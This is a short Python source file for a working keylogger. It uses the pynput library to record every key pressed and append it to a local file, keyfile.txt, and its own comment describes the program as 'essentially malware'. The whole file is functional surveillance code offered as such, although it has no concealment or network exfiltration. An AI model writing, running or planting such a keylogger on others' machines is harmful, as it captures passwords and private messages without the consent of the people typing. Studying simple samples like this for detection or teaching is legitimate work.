#python keylogger

'''
warning! in order to run this code, 
you must allow your computer's security settings to run programs with a potential virus risk,
#as this program is essentially malware

'''

from pynput import keyboard


def keyPressed(key):
    print(str(key))
    with open('keyfile.txt', 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print('Error obtaining char')


if __name__ == '__main__':
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
